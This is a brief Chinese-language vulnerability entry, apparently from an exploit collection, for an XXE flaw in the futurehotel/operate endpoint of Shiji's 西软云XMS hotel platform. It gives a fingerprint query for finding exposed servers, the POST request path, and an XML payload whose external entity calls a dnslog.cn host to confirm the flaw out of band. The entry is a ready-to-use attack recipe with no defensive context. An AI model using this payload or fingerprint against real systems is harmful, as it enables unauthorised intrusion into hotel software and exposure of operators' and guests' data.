# 西软云XMS-futurehoteloperate接口存在XXE漏洞

西软云XMS-futurehoteloperate接口 ｜ XXE ｜ —
- **指纹**：`app="shiji-西软云XMS"`
- **请求**：`POST /XopServerRS/rest/futurehotel/operate HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xxx.dnslog.cn"> %remote;]>
```